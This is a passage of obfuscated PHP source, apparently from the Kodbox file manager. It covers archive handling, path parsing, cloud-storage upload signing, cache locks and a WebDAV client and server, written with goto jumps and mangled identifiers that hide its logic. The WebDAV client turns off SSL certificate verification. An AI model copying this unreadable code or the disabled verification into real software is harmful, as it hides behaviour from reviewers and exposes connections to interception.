array($E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[76]], $E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[761]], $E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[28]]); $a–”çÚİ‡¤ = md5(implode($Eö™Ç˜¥Óº[71], $CéÑ™ø¯ˆÊ)) . $Eö™Ç˜¥Óº[90] . get_path_ext($E—†’ìÌ›Ñ[$Eö™Ç˜¥Óº[28]]); } else { $CéÑ™ø¯ˆÊ = array($Eµ¡›ª’×à[$Eö™Ç˜¥Óº[28]], $Eµ¡›ª’×à[$Eö™Ç˜¥Óº[76]], $Eµ¡›ª’×à[$Eö™Ç˜¥Óº[78]]); $a–”çÚİ‡¤ = md5(implode($Eö™Ç˜¥Óº[71], $CéÑ™ø¯ˆÊ)) . $Eö™Ç˜¥Óº[90] . $Eµ¡›ª’×à[$Eö™Ç˜¥Óº[148]]; } goto AŒ‚Ç¶«Ç“; fÏï®Í©ªÁ: del_dir($bÄ™ÃÀ‘£Û); if (!$eØîËË²½[$Eö™Ç˜¥Óº[757]]) { show_json($eØîËË²½[$Eö™Ç˜¥Óº[759]], !1); } $fÀÄ¾ ÌÈ = json_encode($eØîËË²½[$Eö™Ç˜¥Óº[759]]); goto D¢é‹ŒŞ‘Ê; fßôÃ†“ÕÓ: if ($B°Ìåã³Åì >= 0) { $E„ƒ˜ˆÇÓ— = isset($BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[765]]) ? $BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[765]] : !1; $aŸ÷ù¨•¡¹ = isset($BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[28]]) ? $BŞŒ×ƒ…š‚[$Eö™Ç˜¥Óº[28]] : $Eö™Ç˜¥Óº[33]; KodArchive::filePreview($cãëâÁ¢ÉÜ, $B°Ìåã³Åì, $E„ƒ˜ˆÇÓ—, $aŸ÷ù¨•¡¹); self::archiveExt(); die; } $eØîËË²½ = KodArchive::listContent($cãëâÁ¢ÉÜ); self::archiveExt(); goto fÏï®Í©ªÁ; aÍ­ƒÎ’æ¹: } private function zipFileList($AÓˆ–™Ñ×, $eˆ©à˜«œˆ = false) { $Cš°¬æÅ¢ã =& $_SERVER[ÍÓÖ€°å]; $e¦´é«ñÆ‘ = array(); foreach ($AÓˆ–™Ñ× as $f¨èªºô”ø) { $B¬»Ûñ‚ö = $f¨èªºô”ø[$Cš°¬æÅ¢ã[76]]; if ($eˆ©à˜«œˆ) { $B¬»Ûñ‚ö = self::copy($f¨èªºô”ø[$Cš°¬æÅ¢ã[76]], $eˆ©à˜«œˆ, $Cš°¬æÅ¢ã[503]); } if ($B¬»Ûñ‚ö && self::local()->exist($B¬»Ûñ‚ö)) { $e¦´é«ñÆ‘[$f¨èªºô”ø[$Cš°¬æÅ¢ã[76]]] = $B¬»Ûñ‚ö; } } if (!empty($e¦´é«ñÆ‘)) { return array_values($e¦´é«ñÆ‘); } show_json(LNG($Cš°¬æÅ¢ã[766]), !1); } public static function tmpFileName($c±Ôå³Ö¬ò) { $d½¸¹Ğ«¡ù =& $_SERVER[ÍÓÖ€°å]; $c˜¬À™íÀ = array($c±Ôå³Ö¬ò[$d½¸¹Ğ«¡ù[28]], $c±Ôå³Ö¬ò[$d½¸¹Ğ«¡ù[76]], $c±Ôå³Ö¬ò[$d½¸¹Ğ«¡ù[78]], $c±Ôå³Ö¬ò[$d½¸¹Ğ«¡ù[364]]); return md5(implode($d½¸¹Ğ«¡ù[71], $c˜¬À™íÀ)); } private function localFilePath($EèÇ©±ñ×Ï, $BŸ­ÎÍå–‰) { goto Eá…‹·°Ê·; F‡ø®·¦ù…: return $fâ éÆ­»§->path; goto D¯¦òîãê´; Eá…‹·°Ê·: $Cä§Æô‡‹ =& $_SERVER[ÍÓÖ€°å]; $DÀï¢ÆİÙì = KodIO::parse($EèÇ©±ñ×Ï); if ($DÀï¢ÆİÙì[$Cä§Æô‡‹[29]] == KodIO::KOD_SOURCE) { $c’™ÓÅÎç = Model($Cä§Æô‡‹[512])->fileInfoGet(KodIO::sourceID($EèÇ©±ñ×Ï)); if (!$c’™ÓÅÎç[$Cä§Æô‡‹[76]]) { show_json($Cä§Æô‡‹[767], !1); } $EèÇ©±ñ×Ï = $c’™ÓÅÎç[$Cä§Æô‡‹[76]]; } goto F„óº—Çš”; F„óº—Çš”: $fâ éÆ­»§ = self::init($EèÇ©±ñ×Ï); $B°ØÚÊ– = $fâ éÆ­»§->getType(); $cœö¡Ö© = strtoupper(substr(PHP_OS, 0, 3)) == $Cä§Æô‡‹[768]; goto aÊÉ‡ ¹ñ; aÊÉ‡ ¹ñ: if ($B°ØÚÊ– != $Cä§Æô‡‹[125] || $BŸ­ÎÍå–‰ == $Cä§Æô‡‹[769] && $cœö¡Ö©) { return !1; } if (!$fâ éÆ­»§->exist($fâ éÆ­»§->path)) { show_json(LNG($Cä§Æô‡‹[99]), !1); } self::archiveExt($BŸ­ÎÍå–‰); goto F‡ø®·¦ù…; D¯¦òîãê´: } private function archiveExt($A‘œ—Âœ‚ = '') { $GLOBALS[$_SERVER[ÍÓÖ€°å][770]] = $A‘œ—Âœ‚; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\122\145\143\171\143\154\145\175"; const KOD_USER_FAV = "\173\165\x73\x65\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\x69\x6c\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\x46\x69\154\x65\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\160\122\157\x6f\x74\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\x53\x68\141\162\x65\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\x65\x49\x74\x65\155\114\x69\x6e\153\175"; const KOD_SEARCH = "\173\x73\x65\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\157\143\x6b\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\145\156\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\165\x73\145\x72\104\162\x69\166\x65\162\x7d"; public static function typeList() { $EØÚ¤±ñßÊ =& $_SERVER[ÍÓÖ€°å]; return array($EØÚ¤±ñßÊ[771] => self::KOD_SOURCE, $EØÚ¤±ñßÊ[772] => self::KOD_USER_RECYCLE, $EØÚ¤±ñßÊ[773] => self::KOD_USER_FAV, $EØÚ¤±ñßÊ[774] => self::KOD_USER_FILE_TAG, $EØÚ¤±ñßÊ[775] => self::KOD_USER_FILE_TYPE, $EØÚ¤±ñßÊ[776] => self::KOD_GROUP_ROOT_SELF, $EØÚ¤±ñßÊ[777] => self::KOD_USER_SHARE, $EØÚ¤±ñßÊ[778] => self::KOD_USER_SHARE_TO_ME, $EØÚ¤±ñßÊ[779] => self::KOD_SHARE_ITEM, $EØÚ¤±ñßÊ[780] => self::KOD_SHARE_LINK, $EØÚ¤±ñßÊ[781] => self::KOD_SEARCH, $EØÚ¤±ñßÊ[782] => self::KOD_BLOCK, $EØÚ¤±ñßÊ[783] => self::KOD_IO, $EØÚ¤±ñßÊ[784] => self::KOD_USER_RECENT, $EØÚ¤±ñßÊ[785] => self::KOD_USER_DRIVER); } public static function parse($a¿ÜšŸƒËç) { goto fÚİŸ×Ä; bÒƒµÇµÚ„: return $a°ç›ğÔĞÁ; goto aäĞœ‹Õà•; Cµ¦Ó‹ôÚÃ: preg_match($DĞ³ÎÍ¯öî[786], $a¿ÜšŸƒËç, $e¶†¹Ô„±·); $a°ç›ğÔĞÁ = array($DĞ³ÎÍ¯öî[787] => !1, $DĞ³ÎÍ¯öî[788] => !1, $DĞ³ÎÍ¯öî[789] => !1, $DĞ³ÎÍ¯öî[76] => $a¿ÜšŸƒËç, $DĞ³ÎÍ¯öî[741] => !1, $DĞ³ÎÍ¯öî[740] => $DĞ³ÎÍ¯öî[33]); if (is_array($e¶†¹Ô„±·) && count($e¶†¹Ô„±·) == 5) { $f” Ğ«à¾ó = $DĞ³ÎÍ¯öî[790] . $e¶†¹Ô„±·[2] . $DĞ³ÎÍ¯öî[307]; if (in_array($f” Ğ«à¾ó, $AºÑË˜ğ‹ä)) { $a°ç›ğÔĞÁ[$DĞ³ÎÍ¯öî[741]] = $e¶†¹Ô„±·[1]; $a°ç›ğÔĞÁ[$DĞ³ÎÍ¯öî[29]] = $f” Ğ«à¾ó; $a°ç›ğÔĞÁ[$DĞ³ÎÍ¯öî[791]] = substr($f” Ğ«à¾ó, 1, -1); $a°ç›ğÔĞÁ[$DĞ³ÎÍ¯öî[357]] = $e¶†¹Ô„±·[3]; } $a°ç›ğÔĞÁ[$DĞ³ÎÍ¯öî[740]] = $e¶†¹Ô„±·[4]; } goto bÒƒµÇµÚ„; fÚİŸ×Ä: $DĞ³ÎÍ¯öî =& $_SERVER[ÍÓÖ€°å]; $a¿ÜšŸƒËç = self::clear($a¿ÜšŸƒËç); $AºÑË˜ğ‹ä = array_values(self::typeList()); goto Cµ¦Ó‹ôÚÃ; aäĞœ‹Õà•: } public static function clear($E’¼É…ô¿) { goto C˜ô¤Š±“å; F¡â¨Ïì†¼: if ($E’¼É…ô¿ == $F“çÓ…ÊÎ[8]) { return $F“çÓ…ÊÎ[8]; } $E’¼É…ô¿ = rtrim($E’¼É…ô¿, $F“çÓ…ÊÎ[8]); return $E’¼É…ô¿; goto C÷å’ÒÎí¼; C˜ô¤Š±“å: $F“çÓ…ÊÎ =& $_SERVER[ÍÓÖ€°å]; $E’¼É…ô¿ = str_replace($F“çÓ…ÊÎ[92], $F“çÓ…ÊÎ[8], $E’¼É…ô¿); $a—ï¤Ååß² = $F“çÓ…ÊÎ[792]; goto A«¿ªÌÍ”†; A«¿ªÌÍ”†: if (substr($E’¼É…ô¿, 0, 3) == $F“çÓ…ÊÎ[793]) { $E’¼É…ô¿ = substr($E’¼É…ô¿, 3); } while (strstr($E’¼É…ô¿, $a—ï¤Ååß²)) { $E’¼É…ô¿ = str_replace($a—ï¤Ååß², $F“çÓ…ÊÎ[8], $E’¼É…ô¿); } $E’¼É…ô¿ = preg_replace($F“çÓ…ÊÎ[794], $F“çÓ…ÊÎ[8], $E’¼É…ô¿); goto F¡â¨Ïì†¼; C÷å’ÒÎí¼: } public static function sourceID($Aö÷Şà›À’) { $b¥Î¦Ÿù­Œ =& $_SERVER[ÍÓÖ€°å]; $cß³–ÅÜŠ¦ = self::parse($Aö÷Şà›À’); if ($cß³–ÅÜŠ¦[$b¥Î¦Ÿù­Œ[29]] !== self::KOD_SOURCE) { show_json("\x5b{$Aö÷Şà›À’}\x5d\x20" . LNG($b¥Î¦Ÿù­Œ[795]), !1); } return $cß³–ÅÜŠ¦[$b¥Î¦Ÿù­Œ[357]]; } public static function make($c®ğÙí†õ) { if (!$c®ğÙí†õ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($c®ğÙí†õ)); } public static function makeShare($DĞººòİÄÌ, $dÛ™İ¸«ˆÑ) { return self::makePath(self::KOD_SHARE_ITEM, $DĞººòİÄÌ, $dÛ™İ¸«ˆÑ); } public static function makeFileTypePath($c¡ªÍµ¢æÎ) { return self::makePath(self::KOD_USER_FILE_TYPE, $c¡ªÍµ¢æÎ); } public static function makeFileTagPath($fŸœ´Ââ‰«) { return self::makePath(self::KOD_USER_FILE_TAG, $fŸœ´Ââ‰«); } public static function makePath($b©«æçê, $fÏò‰áœÂ = '', $Fµóƒèõôİ = '') { $CÈáŞŒÊ„¨ =& $_SERVER[ÍÓÖ€°å]; $Aë‚çÛ÷ğš = substr($b©«æçê, 1, -1); $EÆéòªŸÎÛ = $CÈáŞŒÊ„¨[796] . $Aë‚çÛ÷ğš . $CÈáŞŒÊ„¨[483] . $fÏò‰áœÂ . $CÈáŞŒÊ„¨[797]; $EÆéòªŸÎÛ = $Fµóƒèõôİ ? $EÆéòªŸÎÛ . $Fµóƒèõôİ . $CÈáŞŒÊ„¨[8] : $EÆéòªŸÎÛ; return $EÆéòªŸÎÛ; } public static function initSystemPath() { $F…æ…Š»¿¾ =& $_SERVER[ÍÓÖ€°å]; $cæÔóœ› = array($F…æ…Š»¿¾[798] => $F…æ…Š»¿¾[799], $F…æ…Š»¿¾[800] => $F…æ…Š»¿¾[801], $F…æ…Š»¿¾[802] => $F…æ…Š»¿¾[803], $F…æ…Š»¿¾[804] => $F…æ…Š»¿¾[805]); foreach ($cæÔóœ› as $Aº•˜¯·³³ => $f©³¤®ğµ¡) { if (!defined($Aº•˜¯·³³)) { define($Aº•˜¯·³³, self::systemPath($f©³¤®ğµ¡)); } } } private static function systemPath($AÊ²Ô¸Ä™Ú) { goto B®ƒ³ç‰‰Ÿ; c²¸øšÅ¸: return $DŠ‹Á¦«À¡; goto f¡Â‰–ó­¯; B®ƒ³ç‰‰Ÿ: $b¯³ã‰Ù«í =& $_SERVER[ÍÓÖ€°å]; $CªĞ–åå›¶ = $b¯³ã‰Ù«í[806] . ucfirst($AÊ²Ô¸Ä™Ú); $DŠ‹Á¦«À¡ = Model($b¯³ã‰Ù«í[807])->get($CªĞ–åå›¶); goto f­‹¯‹å†Ô; f­‹¯‹å†Ô: if ($DŠ‹Á¦«À¡) { return $DŠ‹Á¦«À¡; } if ($AÊ²Ô¸Ä™Ú == $b¯³ã‰Ù«í[799]) { $DŠ‹Á¦«À¡ = self::make(Model($b¯³ã‰Ù«í[512])->systemRootPathAdd($b¯³ã‰Ù«í[808])); } else { $DŠ‹Á¦«À¡ = self::systemPath($b¯³ã‰Ù«í[799]); $bø…á°¿ = self::sourceID($DŠ‹Á¦«À¡); $DŠ‹Á¦«À¡ = self::make(Model($b¯³ã‰Ù«í[512])->mkdir($bø…á°¿, $AÊ²Ô¸Ä™Ú)); } Model($b¯³ã‰Ù«í[807])->set($CªĞ–åå›¶, $DŠ‹Á¦«À¡); goto c²¸øšÅ¸; f¡Â‰–ó­¯: } public static function systemFolder($eğé·ÁŞŸÍ) { $C©”å„ÄÆ¡ = IO_PATH_SYSTEM_SOURCE . $eğé·ÁŞŸÍ; $b¤šÈÒ²‹® = Cache::get($C©”å„ÄÆ¡); if (!$b¤šÈÒ²‹®) { $d…•ß™ùæ = IO::infoFull($C©”å„ÄÆ¡); if (!$d…•ß™ùæ) { $b¤šÈÒ²‹® = IO::mkdir($C©”å„ÄÆ¡, REPEAT_SKIP); } else { $b¤šÈÒ²‹® = $d…•ß™ùæ[$_SERVER[ÍÓÖ€°å][76]]; } Cache::set($C©”å„ÄÆ¡, $b¤šÈÒ²‹®, 3600 * 10); } return $b¤šÈÒ²‹®; } public static function defaultDriver() { return Model($_SERVER[ÍÓÖ€°å][452])->defaultDriver(); } public static function defaultIO() { $cˆññ¿òË¥ =& $_SERVER[ÍÓÖ€°å]; $b¯¼ŒÉ…ã = self::defaultDriver(); return $cˆññ¿òË¥[809] . $b¯¼ŒÉ…ã[$cˆññ¿òË¥[357]] . $cˆññ¿òË¥[797]; } public static function fileTypeList() { $Aƒª”ò­Ëó =& $_SERVER[ÍÓÖ€°å]; $EŸÀ®íÜÒ™ = $GLOBALS[$Aƒª”ò­Ëó[6]][$Aƒª”ò­Ëó[810]]; foreach ($EŸÀ®íÜÒ™ as $cŒí“Ó…õ´ => $A×î¾´é±) { $eãÛ¦Ü‚°¾ = $Aƒª”ò­Ëó[811] . $cŒí“Ó…õ´; $F‚‹ÆˆÆº¯ = LNG($eãÛ¦Ü‚°¾); if ($eãÛ¦Ü‚°¾ != $F‚‹ÆˆÆº¯) { $EŸÀ®íÜÒ™[$cŒí“Ó…õ´][$Aƒª”ò­Ëó[28]] = $F‚‹ÆˆÆº¯; } } return $EŸÀ®íÜÒ™; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($fğ‹Îá‘ù) { parent::__construct($fğ‹Îá‘ù); $this->signatureVersion($_SERVER[ÍÓÖ€°å][188]); } public function uploadFormData($CÑ¾œõÛ‡¨, $e‡ÜŠµ´£ª = 3600) { goto eÆòÅÚ¯çÃ; Dâİ®Ê†¹‡: return $Bà§âˆ…Â«; goto CÚàòøÑ÷; Dğ³‘½‹£¼: $c·Èçç¤ÏÑ = $e†ïºâ¦ë°[812]; $aİéòŠ¢† = gmdate($e†ïºâ¦ë°[813], time() + $e‡ÜŠµ´£ª); $B‚”¤›àËÏ = (string) time() . $e†ïºâ¦ë°[68] . (string) (time() + $e‡ÜŠµ´£ª); goto AËµ‚êÒ½ã; AËµ‚êÒ½ã: $F¼«½É¦ = array($e†ïºâ¦ë°[814] => $aİéòŠ¢†, $e†ïºâ¦ë°[815] => array(array($e†ïºâ¦ë°[816] => $Cğ’«áÅáˆ), array($e†ïºâ¦ë°[817] => $this->bucket), array($e†ïºâ¦ë°[818], $e†ïºâ¦ë°[819], $e†ïºâ¦ë°[33]), array($e†ïºâ¦ë°[820] => $c·Èçç¤ÏÑ), array($e†ïºâ¦ë°[821] => $Fêôì‡óÆ»), array($e†ïºâ¦ë°[822] => $this->accessKey), array($e†ïºâ¦ë°[823] => $B‚”¤›àËÏ))); $F¼«½É¦ = json_encode($F¼«½É¦); $dÕè‹Ë¤¢ª = hash_hmac($e†ïºâ¦ë°[213], $B‚”¤›àËÏ, $this->secret); goto aÎ‰ÛˆåÛÎ; aÎ‰ÛˆåÛÎ: $eèôæ¼˜Îå = sha1($F¼«½É¦); $EÔê·ŸËƒ™ = hash_hmac($e†ïºâ¦ë°[213], $eèôæ¼˜Îå, $dÕè‹Ë¤¢ª); $Bà§âˆ…Â« = array($e†ïºâ¦ë°[816] => $Cğ’«áÅáˆ, $e†ïºâ¦ë°[820] => $c·Èçç¤ÏÑ, $e†ïºâ¦ë°[824] => base64_encode($F¼«½É¦), $e†ïºâ¦ë°[821] => $Fêôì‡óÆ», $e†ïºâ¦ë°[822] => $this->accessKey, $e†ïºâ¦ë°[825] => $B‚”¤›àËÏ, $e†ïºâ¦ë°[826] => $EÔê·ŸËƒ™, $e†ïºâ¦ë°[157] => $this->getHost()); goto Dâİ®Ê†¹‡; eÆòÅÚ¯çÃ: $e†ïºâ¦ë° =& $_SERVER[ÍÓÖ€°å]; $Cğ’«áÅáˆ = $e†ïºâ¦ë°[173]; $Fêôì‡óÆ» = $e†ïºâ¦ë°[213]; goto Dğ³‘½‹£¼; CÚàòøÑ÷: } } goto C„•˜½ï‡; cÚÑ“¤ëÊÉ: class CacheLockMemcached { public function lock($bÆâñ£—, $dÙš±’¤™õ = 0) { $bØ—ÀÉ‚Ò = Cache::init(); $cÒ¿çò¼‰ = microtime(!0) + $dÙš±’¤™õ; while (microtime(!0) < $cÒ¿çò¼‰) { $dÜã¤›İï§ = $bØ—ÀÉ‚Ò->get($bÆâñ£—); if (!$dÜã¤›İï§ || $dÜã¤›İï§ < microtime(!0)) { $dÜºˆ‡»Ò± = $bØ—ÀÉ‚Ò->handle->add($bÆâñ£—, $cÒ¿çò¼‰, $dÙš±’¤™õ); if ($dÜºˆ‡»Ò±) { return !0; } } cacheLockWait(); } return !1; } public function unlock($B¬‰Â÷éÎ¶) { $a‰‹—‹ÕÌ = Cache::init(); $a‰‹—‹ÕÌ->remove($B¬‰Â÷éÎ¶); } } class CacheLockDatabase { public function lock($aóœÑğõ, $Díâç¥ŸÊ® = 0) { $Fã¹ÇÌÏ’¶ = Model($_SERVER[ÍÓÖ€°å][515]); $F“¥ç³Ë§‰ = microtime(!0) + $Díâç¥ŸÊ®; while (microtime(!0) < $F“¥ç³Ë§‰) { $Dã‰·ŠõŒ„ = $Fã¹ÇÌÏ’¶->get($aóœÑğõ); if (!$Dã‰·ŠõŒ„ || $Dã‰·ŠõŒ„ < microtime(!0)) { $e•»¥†ºí¬ = $Fã¹ÇÌÏ’¶->set($aóœÑğõ, $F“¥ç³Ë§‰); if ($e•»¥†ºí¬) { return !0; } } cacheLockWait(); } return !1; } public function unlock($D­¶´ËïÈ) { Model($_SERVER[ÍÓÖ€°å][515])->remove($D­¶´ËïÈ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dò½ ¯›¸’, $EÚæ´“œ‘Ô) { $Eùƒ´øœ»õ =& $_SERVER[ÍÓÖ€°å]; if (!class_exists($Eùƒ´øœ»õ[533])) { show_json($Eùƒ´øœ»õ[534], !1); } $this->cacheTime = $EÚæ´“œ‘Ô; $this->handle = new Memcached(); if (is_array($dò½ ¯›¸’[$Eùƒ´øœ»õ[535]]) && count($dò½ ¯›¸’[$Eùƒ´øœ»õ[535]]) >= 1) { foreach ($dò½ ¯›¸’[$Eùƒ´øœ»õ[535]] as $eĞ•ƒöé×Â) { $D¿­ˆ§Æø = explode($Eùƒ´øœ»õ[4], $eĞ•ƒöé×Â); $this->handle->addServer($D¿­ˆ§Æø[0], $D¿­ˆ§Æø[1]); } } else { $this->handle->addServer($dò½ ¯›¸’[$Eùƒ´øœ»õ[157]], $dò½ ¯›¸’[$Eùƒ´øœ»õ[158]]); } } public function set($aöçŸé†ê, $bÈõëíª‚», $dÇíéíò = false) { $dÇíéíò = $dÇíéíò ? $dÇíéíò : $this->cacheTime; return $this->handle->set($aöçŸé†ê, $bÈõëíª‚», $dÇíéíò); } public function get($bÀÂÊßÈ‰œ) { return $this->handle->get($bÀÂÊßÈ‰œ); } public function remove($fí½‘„Ç‰Ù) { return $this->handle->delete($fí½‘„Ç‰Ù); } public function deleteAll() { return $this->handle->flush(); } } goto C °¹½†‹ò; FØ‚†ôÜÀ: class HttpDavClient { public function __construct($A¯ÌÚñá¿, $A¸â†—Ó§õ, $BŠ‡ëº«¸) { $this->header = array(); $this->userName = $A¸â†—Ó§õ; $this->userPassowrd = $BŠ‡ëº«¸; } protected function makePath($AŒÔÊ‘›À) { return $AŒÔÊ‘›À; } protected function setHeader($BÚäõÖŞ, $aÆòÊÕ·×Ù = false) { if ($aÆòÊÕ·×Ù === !1) { $this->header[] = $BÚäõÖŞ; } else { $this->header[] = $BÚäõÖŞ . $_SERVER[ÍÓÖ€°å][635] . $aÆòÊÕ·×Ù; } } public function move($bÊëÅÙ¥‹¹, $F‰Ä‹›ñõ, $fß¢º¯Íç¥ = '') { $cÍï†Î‡ =& $_SERVER[ÍÓÖ€°å]; $this->setHeader($cÍï†Î‡[1164], $this->makePath($F‰Ä‹›ñõ)); $this->setHeader($cÍï†Î‡[1165], $cÍï†Î‡[1166]); if ($fß¢º¯Íç¥) { $this->setHeader($cÍï†Î‡[1167], $cÍï†Î‡[680] . $fß¢º¯Íç¥ . $cÍï†Î‡[683]); } return $this->send($cÍï†Î‡[1168], $bÊëÅÙ¥‹¹); } public function copy($BË­–ÍÈòÕ, $CéÄœºˆ‹Ó) { $D×›áòíŒ =& $_SERVER[ÍÓÖ€°å]; $this->setHeader($D×›áòíŒ[1164], $this->makePath($CéÄœºˆ‹Ó)); $this->setHeader($D×›áòíŒ[1165], $D×›áòíŒ[1166]); return $this->send($D×›áòíŒ[1169], $BË­–ÍÈòÕ); } public function mkcol($EĞÛßÑç¨˜) { $bà¼‡ãÑ„Æ =& $_SERVER[ÍÓÖ€°å]; $this->setHeader($bà¼‡ãÑ„Æ[1165], $bà¼‡ãÑ„Æ[1166]); return $this->send($bà¼‡ãÑ„Æ[1170], $EĞÛßÑç¨˜); } public function delete($a§ÁŒ†ñ¼í, $f·íªÏ°İ = '') { $Bí†–¤‹•ì =& $_SERVER[ÍÓÖ€°å]; if ($f·íªÏ°İ) { $this->setHeader($Bí†–¤‹•ì[1167], $Bí†–¤‹•ì[680] . $f·íªÏ°İ . $Bí†–¤‹•ì[683]); } return $this->send($Bí†–¤‹•ì[1171], $a§ÁŒ†ñ¼í); } public function propfind($a³ç­İğ¦) { $EÎçŒâ½Ù =& $_SERVER[ÍÓÖ€°å]; $this->setHeader($EÎçŒâ½Ù[1172], $EÎçŒâ½Ù[367]); $this->setHeader($EÎçŒâ½Ù[1173], $EÎçŒâ½Ù[1174]); $c£ØÉ…šâ„ = $EÎçŒâ½Ù[1175]; return $this->send($EÎçŒâ½Ù[1176], $a³ç­İğ¦, $c£ØÉ…šâ„); } public function options($EÒàÉØŠÇ·) { return $this->send($_SERVER[ÍÓÖ€°å][1177], $EÒàÉØŠÇ·); } public function get($Eë„Î°¶÷Á) { return $this->send($_SERVER[ÍÓÖ€°å][211], $Eë„Î°¶÷Á); } public function put($aï¬²®§ÎŒ, $D®è°Ìİ¸, $CÖã‘ÌÚ­ = '') { $FôÍ›ø‹ƒ¾ =& $_SERVER[ÍÓÖ€°å]; if ($CÖã‘ÌÚ­) { $this->setHeader($FôÍ›ø‹ƒ¾[1167], $FôÍ›ø‹ƒ¾[680] . $CÖã‘ÌÚ­ . $FôÍ›ø‹ƒ¾[683]); } return $this->send($FôÍ›ø‹ƒ¾[209], $aï¬²®§ÎŒ, $D®è°Ìİ¸); } protected function send($F‘ÀñæÒÔ“, $bìÕòï§£è, $cÑº¥Ï—ªº = false, $E¤äÅñ˜ = false) { goto a§´…õÎù¼; F•¼»ã³˜: curl_setopt($cÕ’ØÍ×’…, CURLOPT_HTTPHEADER, $this->header); curl_setopt($cÕ’ØÍ×’…, CURLOPT_RETURNTRANSFER, !0); curl_setopt($cÕ’ØÍ×’…, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BÑå±¯ŠëĞ; BÑå±¯ŠëĞ: curl_setopt($cÕ’ØÍ×’…, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($cÕ’ØÍ×’…, CURLOPT_SSL_VERIFYHOST, !1); $B¤®Ù¬ËÜÁ = curl_exec($cÕ’ØÍ×’…); goto bãË—ª¤ ; bãË—ª¤ : $this->header = array(); return $B¤®Ù¬ËÜÁ; goto B…ÍòšòØ; eÈÔˆôä¯º: $cÕ’ØÍ×’… = curl_init($bìÕòï§£è); curl_setopt($cÕ’ØÍ×’…, CURLOPT_CUSTOMREQUEST, $F‘ÀñæÒÔ“); curl_setopt($cÕ’ØÍ×’…, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto F•¼»ã³˜; dŸ“±Ñ÷İî: $this->setHeader($fÊÊ•ÓÍºŸ); if ($cÑº¥Ï—ªº) { $cÑº¥Ï—ªº = $Bï‹Ê½ò½Ø[1179] . $cÑº¥Ï—ªº; } if (!request_url_safe($bìÕòï§£è)) { return !1; } goto eÈÔˆôä¯º; a§´…õÎù¼: $Bï‹Ê½ò½Ø =& $_SERVER[ÍÓÖ€°å]; $fÊÊ•ÓÍºŸ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($Bï‹Ê½ò½Ø[1178], $Bï‹Ê½ò½Ø[50]); goto dŸ“±Ñ÷İî; B…ÍòšòØ: } } class HttpDavServer { public function __construct($e‰Ö‚ŸŞ, $b“º¸Ÿ“º) { $this->root = $e‰Ö‚ŸŞ; $this->initPath($b“º¸Ÿ“º); $this->start(); } public function initPath($bË½™°§”‡) { $böÒ—ªÏÒÔ =& $_SERVER[ÍÓÖ€°å]; $E›Óƒù‘Ñ = rtrim($_SERVER[$böÒ—ªÏÒÔ[428]], $böÒ—ªÏÒÔ[8]) . $böÒ—ªÏÒÔ[8]; $this->urlBase = substr($E›Óƒù‘Ñ, 0, strpos($E›Óƒù‘Ñ, $bË½™°§”‡) + 1); $this->urlBase = rtrim($this->urlBase, $böÒ—ªÏÒÔ[8]) . $bË½™°§”‡; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $bå¿É„Ü  =& $_SERVER[ÍÓÖ€°å]; $A…„„š ïÄ = HttpAuth::get(); if ($A…„„š ïÄ[$bå¿É„Ü [407]] == $bå¿É„Ü [1180] && $A…„„š ïÄ[$bå¿É„Ü [652]] == $bå¿É„Ü [1181]) { return !0; } HttpAuth::error(); } public function start() { goto EÉÓì¢ˆ«; dŒäÕå’­: if (!method_exists($this, $eë¾‡½©µ‰)) { pr($eë¾‡½©µ‰ . $Bª©²Ÿ“ëÀ[1182]); die; } $CòŸ‰­¾Â = array($Bª©²Ÿ“ëÀ[1183], $Bª©²Ÿ“ëÀ[1184]); if (!in_array($eë¾‡½©µ‰, $CòŸ‰­¾Â) && !$this->pathExists($this->path)) { $cÆ–È¿Á¦ô = array($Bª©²Ÿ“ëÀ[757] => 404); } else { $cÆ–È¿Á¦ô = $this->{$eë¾‡½©µ‰}(); } goto Aï’ƒ¹‡¨ë; EÉÓì¢ˆ«: $Bª©²Ÿ“ëÀ =& $_SERVER[ÍÓÖ€°å]; $this->checkUser(); $eë¾‡½©µ‰ = $Bª©²Ÿ“ëÀ[134] . HttpHeader::method(); goto dŒäÕå’­; Aï’ƒ¹‡¨ë: if (!$cÆ–È¿Á¦ô) { return; } self::response($cÆ–È¿Á¦ô); goto E¯á©ïíá; E¯á©ïíá: } public function pathGet($E›³¿¼¿¶Ü = false) { $Cù°¼îøÛ =& $_SERVER[ÍÓÖ€°å]; $e„­øÔç = $E›³¿¼¿¶Ü ? $_SERVER[$Cù°¼îøÛ[1185]] : $_SERVER[$Cù°¼îøÛ[428]]; $e„­øÔç = KodIO::clear(rawurldecode($e„­øÔç)); if (!strstr($e„­øÔç, KodIO::clear($this->urlBase))) { return !1; } return substr($e„­øÔç, strpos($e„­øÔç, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Eòİ‘Ö²¬Ì) { return file_exists($Eòİ‘Ö²¬Ì); } public function pathMkdir($bšÎ¥ œ „) { return 